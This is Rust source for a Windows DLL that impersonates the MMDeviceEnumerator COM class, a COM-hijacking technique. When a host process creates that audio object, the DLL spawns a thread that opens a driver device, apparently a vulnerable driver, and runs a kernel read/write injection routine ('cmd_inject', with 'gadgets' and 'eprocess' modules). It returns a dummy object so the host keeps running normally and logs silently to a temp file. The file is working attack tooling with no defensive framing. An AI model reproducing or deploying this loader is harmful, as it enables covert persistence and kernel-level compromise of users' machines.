#![allow(non_snake_case, dead_code, unsafe_op_in_unsafe_fn)]

use std::ffi::c_void;
use windows_sys::core::{GUID, HRESULT};
use windows_sys::Win32::Foundation::{CLASS_E_CLASSNOTAVAILABLE, E_NOINTERFACE, S_OK, HMODULE};
use windows_sys::Win32::System::SystemServices::DLL_PROCESS_ATTACH;

mod commands {
    pub mod borrow {
        include!("../borrow.rs");
    }
}
#[path = "../../DriversCloud/src/device.rs"] pub mod device;
#[path = "../../DriversCloud/src/eprocess.rs"] pub mod eprocess;
#[path = "../../DriversCloud/src/gadgets.rs"] pub mod gadgets;
#[path = "../../DriversCloud/src/kernel_rw.rs"] pub mod kernel_rw;
#[path = "../../DriversCloud/src/utils.rs"] pub mod utils;

fn log(msg: &str) {
    use windows_sys::Win32::Foundation::{CloseHandle, GENERIC_WRITE};
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, WriteFile, FILE_APPEND_DATA, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_ALWAYS,
    };
    let path = crate::utils::to_wide("C:\\Windows\\Temp\\mmdevlib.log");
    unsafe {
        let h = CreateFileW(
            path.as_ptr(),
            FILE_APPEND_DATA,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            std::ptr::null(),
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            std::ptr::null_mut(),
        );
        if h != windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE {
            let s = format!("[mmdevlib] {}\r\n", msg);
            let mut written = 0;
            WriteFile(h, s.as_ptr(), s.len() as u32, &mut written, std::ptr::null_mut());
            CloseHandle(h);
        }
    }
}

const CLSID_MMDeviceEnumerator: GUID = GUID {
    data1: 0xD9144DCD,
    data2: 0xE998,
    data3: 0x4ECA,
    data4: [0xAB, 0x6A, 0xDC, 0xD8, 0x3C, 0xCB, 0xA1, 0x6D],
};

const IID_IUnknown: GUID = GUID {
    data1: 0x00000000,
    data2: 0x0000,
    data3: 0x0000,
    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
};

const IID_IClassFactory: GUID = GUID {
    data1: 0x00000001,
    data2: 0x0000,
    data3: 0x0000,
    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
};

#[repr(C)]
struct IUnknownVtbl {
    pub QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> HRESULT,
    pub AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    pub Release: unsafe extern "system" fn(*mut c_void) -> u32,
}

#[repr(C)]
struct DummyObject {
    pub vtbl: *const IUnknownVtbl,
}

unsafe extern "system" fn Dummy_QueryInterface(
    this: *mut c_void,
    riid: *const GUID,
    ppvObject: *mut *mut c_void,
) -> HRESULT {
    if ppvObject.is_null() { return E_NOINTERFACE; }
    let riid = &*riid;
    if riid.data1 == IID_IUnknown.data1 && riid.data2 == IID_IUnknown.data2 && riid.data3 == IID_IUnknown.data3 && riid.data4 == IID_IUnknown.data4 {
        *ppvObject = this;
        return S_OK;
    }
    *ppvObject = std::ptr::null_mut();
    E_NOINTERFACE
}

unsafe extern "system" fn Dummy_AddRef(_this: *mut c_void) -> u32 { 2 }
unsafe extern "system" fn Dummy_Release(_this: *mut c_void) -> u32 { 1 }

static DUMMY_VTBL: IUnknownVtbl = IUnknownVtbl {
    QueryInterface: Dummy_QueryInterface,
    AddRef: Dummy_AddRef,
    Release: Dummy_Release,
};

static mut DUMMY_INSTANCE: DummyObject = DummyObject {
    vtbl: &DUMMY_VTBL,
};

#[repr(C)]
struct IClassFactoryVtbl {
    pub QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> HRESULT,
    pub AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    pub Release: unsafe extern "system" fn(*mut c_void) -> u32,
    pub CreateInstance: unsafe extern "system" fn(*mut c_void, *mut c_void, *const GUID, *mut *mut c_void) -> HRESULT,
    pub LockServer: unsafe extern "system" fn(*mut c_void, i32) -> HRESULT,
}

#[repr(C)]
struct MyClassFactory {
    pub vtbl: *const IClassFactoryVtbl,
}

static mut FACTORY_REF_COUNT: u32 = 0;
static mut GLOBAL_REF_COUNT: u32 = 0;

unsafe extern "system" fn Factory_QueryInterface(
    this: *mut c_void,
    riid: *const GUID,
    ppvObject: *mut *mut c_void,
) -> HRESULT {
    if ppvObject.is_null() {
        return E_NOINTERFACE;
    }
    let riid = &*riid;
    if riid.data1 == IID_IUnknown.data1 && riid.data2 == IID_IUnknown.data2 && riid.data3 == IID_IUnknown.data3 && riid.data4 == IID_IUnknown.data4 ||
       riid.data1 == IID_IClassFactory.data1 && riid.data2 == IID_IClassFactory.data2 && riid.data3 == IID_IClassFactory.data3 && riid.data4 == IID_IClassFactory.data4 {
        *ppvObject = this;
        Factory_AddRef(this);
        return S_OK;
    }
    *ppvObject = std::ptr::null_mut();
    E_NOINTERFACE
}

unsafe extern "system" fn Factory_AddRef(_this: *mut c_void) -> u32 {
    FACTORY_REF_COUNT += 1;
    FACTORY_REF_COUNT
}

unsafe extern "system" fn Factory_Release(_this: *mut c_void) -> u32 {
    FACTORY_REF_COUNT -= 1;
    FACTORY_REF_COUNT
}

unsafe extern "system" fn Factory_CreateInstance(
    _this: *mut c_void,
    pUnkOuter: *mut c_void,
    _riid: *const GUID,
    ppvObject: *mut *mut c_void,
) -> HRESULT {
    log("Factory_CreateInstance called!");
    
    if !pUnkOuter.is_null() {
        return CLASS_E_CLASSNOTAVAILABLE;
    }

    std::thread::spawn(|| {
        if let Ok(dev) = device::Device::open(device::DEVICE_PATH) {
            if let Err(e) = commands::borrow::cmd_inject(&dev, None) {
                let msg = format!("cmd_inject failed: {:?}", e);
                commands::borrow::log_debug(&msg);
            }
        }
    });

    *ppvObject = std::ptr::addr_of_mut!(DUMMY_INSTANCE) as *mut c_void;
    S_OK
}

unsafe extern "system" fn Factory_LockServer(_this: *mut c_void, fLock: i32) -> HRESULT {
    if fLock != 0 {
        GLOBAL_REF_COUNT += 1;
    } else {
        GLOBAL_REF_COUNT -= 1;
    }
    S_OK
}

static FACTORY_VTBL: IClassFactoryVtbl = IClassFactoryVtbl {
    QueryInterface: Factory_QueryInterface,
    AddRef: Factory_AddRef,
    Release: Factory_Release,
    CreateInstance: Factory_CreateInstance,
    LockServer: Factory_LockServer,
};

static mut MY_FACTORY: MyClassFactory = MyClassFactory {
    vtbl: &FACTORY_VTBL,
};

#[unsafe(no_mangle)]
pub extern "system" fn DllGetClassObject(
    rclsid: *const GUID,
    riid: *const GUID,
    ppv: *mut *mut c_void,
) -> HRESULT {
    log("DllGetClassObject called!");
    
    if rclsid.is_null() || riid.is_null() || ppv.is_null() {
        return E_NOINTERFACE;
    }

    let rclsid = unsafe { &*rclsid };
    if rclsid.data1 == CLSID_MMDeviceEnumerator.data1 &&
       rclsid.data2 == CLSID_MMDeviceEnumerator.data2 &&
       rclsid.data3 == CLSID_MMDeviceEnumerator.data3 &&
       rclsid.data4 == CLSID_MMDeviceEnumerator.data4 {
        unsafe {
            return Factory_QueryInterface(std::ptr::addr_of_mut!(MY_FACTORY) as *mut c_void, riid, ppv);
        }
    }

    CLASS_E_CLASSNOTAVAILABLE
}

#[unsafe(no_mangle)]
pub extern "system" fn DllCanUnloadNow() -> HRESULT {
    unsafe {
        if FACTORY_REF_COUNT == 0 && GLOBAL_REF_COUNT == 0 {
            S_OK
        } else {
            1
        }
    }
}

#[unsafe(no_mangle)]
pub extern "system" fn DllMain(
    _hinst: HMODULE,
    reason: u32,
    _reserved: *mut c_void,
) -> i32 {
    if reason == DLL_PROCESS_ATTACH {
        log(&format!("DLL_PROCESS_ATTACH at {:?}", std::time::SystemTime::now()));
    }
    1
}
